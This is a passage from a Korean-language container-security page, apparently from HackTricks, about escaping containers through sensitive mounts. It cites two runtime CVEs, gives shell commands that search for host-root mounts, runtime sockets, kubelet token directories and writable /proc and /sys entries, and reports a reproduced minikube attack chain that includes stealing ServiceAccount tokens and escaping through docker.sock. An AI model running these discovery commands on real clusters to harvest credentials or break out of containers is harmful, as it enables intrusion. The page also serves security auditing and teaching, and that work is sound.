- Buildah 및 Podman 빌드 흐름의 `CVE-2024-1753`: 빌드 중 조작된 bind mount가 `/`에 읽기-쓰기 접근을 노출할 수 있었습니다.
- `containerd` 2.1.0의 `CVE-2025-47290`: 이미지 압축 해제 중 발생하는 TOCTOU로 인해 특수하게 조작된 이미지가 pull 중 호스트 파일시스템을 수정할 수 있었습니다.

이 CVE들이 여기서 중요한 이유는 mount 처리가 운영자 설정에만 좌우되지 않는다는 점을 보여주기 때문입니다. 런타임 자체도 mount를 통한 탈출 조건을 만들 수 있습니다.

## 확인

다음 명령으로 영향이 가장 큰 mount 노출을 빠르게 찾으세요:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

여기서 주목할 점:

- 호스트 루트, `/proc`, `/sys`, `/var`, 런타임 소켓은 모두 우선순위가 높은 발견 항목입니다.
- 쓰기 가능한 proc/sys 항목은 안전한 컨테이너 뷰가 아니라 호스트 전역 커널 제어 기능이 마운트에 노출되고 있음을 의미하는 경우가 많습니다.
- 마운트된 `/var` 경로는 파일시스템 검토뿐 아니라 자격 증명과 인접 워크로드 검토도 필요합니다.
- Kubelet 상태 디렉터리와 CNI/플러그인 경로는 런타임 소켓과 동일한 우선순위로 다뤄야 합니다. 노드의 Pod 생성 및 자격 증명 배포 경로에 직접 연결되어 있는 경우가 많기 때문입니다.

## 로컬 검증 상태

이 페이지의 실전 공격 체인은 로컬 Linux minikube 노드에서 확인했습니다. 검증을 통해 다음을 재현했습니다.

- 임시 쓰기 가능한 hostPath를 통한 읽기 및 쓰기 액세스
- `/var/lib/kubelet/pods`를 통해 프로젝션된 ServiceAccount 토큰과 마운트된 Secret 발견
- 마운트된 kubelet 상태에서 복구한 유효 토큰으로 Kubernetes API 인증 성공
- 마운트된 `/var`를 통해 인접한 Docker `overlay2` 파일시스템을 읽기 전용으로 발견
- 마운트된 `docker.sock`을 통해 읽기 전용 호스트 바인드를 사용하는 형제 컨테이너를 Docker API로 생성
- 임시 호스트 소비 훅을 통한 지연된 호스트 실행
- 원래 플러그인의 인수, 표준 입력 및 실행을 그대로 유지하는 CNI 래퍼 시뮬레이션

같은 노드에서 `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore`, `config.gz`가 노출되어 있었지만, `uevent_helper`, EFI 변수, thermal 항목, `sched_debug`는 노출되지 않았습니다. 파괴적인 커널 트리거는 실행하지 않았습니다. 이를 통해 호스트 루트, `/var`, kubelet 상태, 소켓 및 호스트 소비자 공격 체인은 재현 가능하지만, procfs/sysfs 헬퍼 기법은 정확한 커널, 마운트 모드, 페이로드 경로 및 트리거에 따라 달라질 수 있음을 확인했습니다.

## References

- [1] [Kubelet에서 사용하는 로컬 파일 및 경로](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent 컨테이너가 `hostPath` 마운트를 통해 호스트에 액세스할 수 있음](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
